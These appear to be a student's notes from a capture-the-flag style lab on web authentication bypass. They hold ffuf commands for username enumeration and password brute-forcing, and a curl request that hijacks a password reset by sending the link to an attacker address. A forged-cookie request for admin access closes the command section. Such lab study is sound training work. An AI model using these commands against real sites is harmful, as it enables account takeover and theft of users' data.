# Authentication Bypass

**Path:** Jr Penetration Tester > Intro to Web Hacking  

**Date Completed:** Mar 15th, 2026

**Difficulty:** Easy

---

## Summary
This room talks about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data. 

---

## Key Concepts
- A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames
- A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker
- Cookies are small pieces of data stored on your device by a website so that they 'remember' information about you
	- After they been saved with a 'Set Cookie: ' header, every further request you make, you'll send the cookie data back to the web server
---

## Commands & Tools
```bash

# Produce a list of valid usernames already signed up on the system

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.173.155/customers/signup -mr "username already exists"

	# -w selects the wordlist of potential usernames
	# -X specifies the request method (GET by default)
	# -d specifies the data that we are going to send (e.g. username, password, cpassword) - FUZZ is variable for iteration from wordlist
	# -H is used for adding additional headers to the request (in this case Content Type so the server knows we are sending data)
	# -u specifies the URL we are making the request to
	# -mr is the text on the page we are looking for to validate we've found a valid username.

# Use list of valid usernames with password wordlist to bruteforce a login success

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.173.155/customers/login -fc 200

	#  -w argument but separated with a comma, and each wordlist is set to a variable (in this case W1 and W2, which are used in the same way as the FUZZ varaible)
	# - fc checks for an HTTP status code other than 200.

# Login Auth Bypass with curl

curl 'http://10.48.135.206/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

# provides two different values for the same field (one in the URL query string, one in the POST body)
# backend code uses the query string to identify which account is being targeted, and then uses the POST body to decide where to send the password reset link (due to a logic flaw in the application)

curl -H "Cookie: logged_in=true; admin=true" http://10.48.135.206/cookie-test # using header "Cookie: " to bypass authentication
	
```

---

## What I Learned
- Website error messages are great resources for collating this information to build our list of valid usernames (e.g. if error 'username is taken', then we know that is a valid username)
- FFUF (Fuzz Faster U Fool) is a valuable fuzzing tool for discovering hidden files, directories, parameters, and virtual hosts on web servers.
- Editing HTTP headers is a powerful way to exploit poor logic/data handling vulnerabilities (e.g. cookies, username/email data, etc...)
---

## References
- [Good hash cracker](https://crackstation.net/)
